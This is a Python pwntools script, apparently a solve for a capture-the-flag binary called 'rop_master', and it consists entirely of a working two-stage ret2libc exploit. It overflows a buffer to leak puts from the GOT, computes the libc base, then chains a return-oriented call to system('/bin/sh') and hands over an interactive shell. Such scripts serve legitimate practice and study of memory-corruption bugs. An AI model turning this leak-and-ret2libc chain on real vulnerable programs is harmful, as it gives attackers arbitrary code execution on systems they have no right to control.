#!/usr/bin/env python3

from pwn import *

BINARY = './rop_master'
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

elf = ELF(BINARY)
libc = ELF(LIBC)

POP_RDI = 0x401243
POP_RSI_R15 = 0x401241
RET = 0x401016

PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']
MAIN_ADDR = elf.symbols['main']

def exploit():
    p = process(BINARY)
    
    payload = b'A' * 64
    payload += b'B' * 8
    payload += p64(POP_RDI)
    payload += p64(PUTS_GOT)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN_ADDR)
    
    p.recvuntil(b'payload: ')
    p.sendline(payload)
    
    p.recvuntil(b'Goodbye!\n')
    leaked = p.recvline().strip()
    leaked += b'\x00' * (8 - len(leaked))
    puts_addr = u64(leaked)
    
    log.info(f"Leaked puts@libc: {hex(puts_addr)}")
    
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    log.info(f"libc base: {hex(libc_base)}")
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(bin_sh_addr)}")
    
    payload2 = b'A' * 64
    payload2 += b'B' * 8
    payload2 += p64(RET)
    payload2 += p64(POP_RDI)
    payload2 += p64(bin_sh_addr)
    payload2 += p64(system_addr)
    
    p.recvuntil(b'payload: ')
    p.sendline(payload2)
    
    log.success("Got shell!")
    p.interactive()

if __name__ == '__main__':
    exploit()
